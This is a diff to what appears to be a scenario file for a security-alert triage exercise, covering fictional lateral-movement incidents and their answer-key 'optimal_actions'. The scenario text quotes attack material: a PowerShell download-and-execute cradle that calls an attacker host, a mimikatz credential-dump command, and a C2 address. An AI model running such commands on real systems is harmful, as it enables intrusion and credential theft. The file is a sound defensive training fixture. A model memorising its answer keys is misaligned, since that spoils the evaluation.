@@ -45,7 +45,7 @@ LATERAL_SCENARIOS = [
             "analyze_payload": "RDP sessions used to verify post-patch service health on 14 application and database servers. Each session lasted 1-3 minutes -- consistent with service-check workflow. No file transfers detected. No new processes launched.",
             "correlate_alerts": "Change ticket CHG-20260412-0019: 'Q2 Patch Tuesday -- verify service health post-reboot.' Approved by manager t.reynolds on 2026-04-11. WSUS confirms patches applied to all 14 servers at 08:00 UTC. Scheduled reboot completed at 08:45 UTC.",
         },
-        "optimal_actions": ["verify_change_ticket", "classify_benign", "close_alert"],
+        "optimal_actions": [5, 2, 3, 10],
         "impact_if_missed": "No impact. Escalating would delay routine infrastructure maintenance and generate a false positive for a trusted admin.",
     },
     # THREAT 1 -- Pass-the-hash attack
@@ -93,7 +93,7 @@ LATERAL_SCENARIOS = [
             "analyze_payload": "Mimikatz sekurlsa::logonpasswords executed, extracting NTLM hash for admin.svc_deploy (cached from prior admin logon). Hash used to authenticate to DC-PROD-01. Attacker then created backdoor domain account with full admin rights.",
             "correlate_alerts": "EDR alert: mimikatz.exe on WS-MKTG-0041 at 03:20 (not yet triaged). Email gateway: hannah.brooks received phishing email with .hta attachment on Apr 11 21:50 -- clicked at 22:15. No change ticket exists. admin.svc_deploy should never authenticate from Marketing VLAN.",
         },
-        "optimal_actions": ["isolate_endpoint", "disable_compromised_accounts", "remove_backdoor_account", "rotate_domain_admin_credentials", "block_ntlm_from_workstations", "preserve_evidence", "escalate_incident_response"],
+        "optimal_actions": [1, 4, 5, 7, 8, 6],
         "impact_if_missed": "Attacker maintains persistent Domain Admin access via backdoor account, enabling full domain compromise, data exfiltration, ransomware deployment, or complete infrastructure takeover.",
     },
     # THREAT 2 -- RDP brute force from compromised host
@@ -109,6 +109,7 @@ LATERAL_SCENARIOS = [
             "breach_notification_hours": 72,
             "data_volume": "bulk",
             "mandatory_escalation": False,
+            "data_classification": "EU Personal Data",
         },
         "mitre": {"tactic": "Lateral Movement", "technique": "T1021", "name": "Remote Services"},
         "alert": {
@@ -149,7 +150,7 @@ LATERAL_SCENARIOS = [
             "analyze_payload": "Brute force attempted 18 usernames (administrator, admin, svc_backup, svc_deploy, sa, root, etc.) against 23 servers. svc_backup password cracked (weak password: Backup2024!). Post-auth: reconnaissance commands (whoami, net share, systeminfo) on APP-API-01 and DB-STAGING-01.",
             "correlate_alerts": "EDR alert: Cobalt Strike on WS-ACCT-0019 at 03:55 (not yet triaged). Email gateway: david.kim opened malicious xlsm attachment at 03:50. Firewall: no outbound C2 blocked yet -- beacon using DNS over HTTPS. svc_backup has no MFA requirement.",
         },
-        "optimal_actions": ["isolate_source_endpoint", "isolate_compromised_servers", "disable_svc_backup", "rotate_all_service_account_passwords", "block_source_ip_at_firewall", "preserve_evidence", "escalate_incident_response"],
+        "optimal_actions": [1, 3, 5, 7, 8, 6],
         "impact_if_missed": "Attacker pivots from compromised accounting workstation to application and database servers, gaining access to staging databases, customer records, and potential production environment via svc_backup credentials.",
     },
     # THREAT 3 -- Service account abuse for lateral movement
@@ -165,6 +166,7 @@ LATERAL_SCENARIOS = [
             "breach_notification_hours": 72,
             "data_volume": "massive",
             "mandatory_escalation": True,
+            "data_classification": "Cardholder Data",
         },
         "mitre": {"tactic": "Lateral Movement", "technique": "T1021", "name": "Remote Services"},
         "alert": {
@@ -204,7 +206,7 @@ LATERAL_SCENARIOS = [
             "analyze_payload": "Full dump of customers table (450K records including names, emails, addresses, phone numbers). Exported via BCP to CSV, compressed with 7-Zip using password 'Encrypted!'. Archive then accessed from 10.30.4.55 via admin share (C$) -- this is the same IP as the Pass-the-Hash source.",
             "correlate_alerts": "10.30.4.55 (WS-MKTG-0041) is the compromised host from the pass-the-hash attack (lateral-002). Attack chain: phishing -> Cobalt Strike -> mimikatz -> PtH to DB-REPLICA-01 -> pivot to DB-PROD-01 via svc_sqlagent -> data staging. No change ticket. svc_sqlagent GPO for 'Deny interactive logon' was removed 3 days ago (change not authorized).",
         },
-        "optimal_actions": ["isolate_db_prod", "isolate_db_replica", "disable_svc_sqlagent", "rotate_all_sql_credentials", "preserve_evidence", "activate_breach_notification_process", "escalate_incident_response"],
+        "optimal_actions": [1, 4, 5, 7, 8],
         "impact_if_missed": "450K customer PII records staged for exfiltration. If data leaves the network, triggers mandatory breach notification under GDPR/CCPA, potential multi-million dollar fines, and severe reputational damage.",
     },
     # THREAT 4 -- WMI lateral movement
@@ -253,7 +255,7 @@ LATERAL_SCENARIOS = [
             "analyze_payload": "Base64 PowerShell decodes to: IEX(New-Object Net.WebClient).DownloadString('http://10.30.7.33:8080/stager.ps1'). Certutil downloading s.exe (SHA256: a1b2c3...) matches Cobalt Strike beacon. Objective: establish persistent footholds on 6 internal servers for later data exfiltration or ransomware staging.",
             "correlate_alerts": "Attack chain: phishing -> macro -> LaZagne credential dump -> admin.jthomas hash harvested -> WMI lateral movement to 6 servers. j.thomas (real admin) is on PTO -- did not initiate activity. C2 callbacks to 185.220.101.44 (Tor exit node). Threat intel: IP linked to APT group activity.",
         },
-        "optimal_actions": ["isolate_all_affected_hosts", "disable_admin_jthomas", "disable_wmi_remote", "block_c2_ip", "rotate_domain_admin_credentials", "preserve_evidence", "escalate_incident_response", "engage_threat_intel"],
+        "optimal_actions": [1, 3, 5, 7, 8, 6],
         "impact_if_missed": "Attacker establishes persistent Cobalt Strike beacons on 6 production servers using a Domain Admin account, enabling full network compromise, ransomware staging, or long-term espionage operations.",
     },
 ]
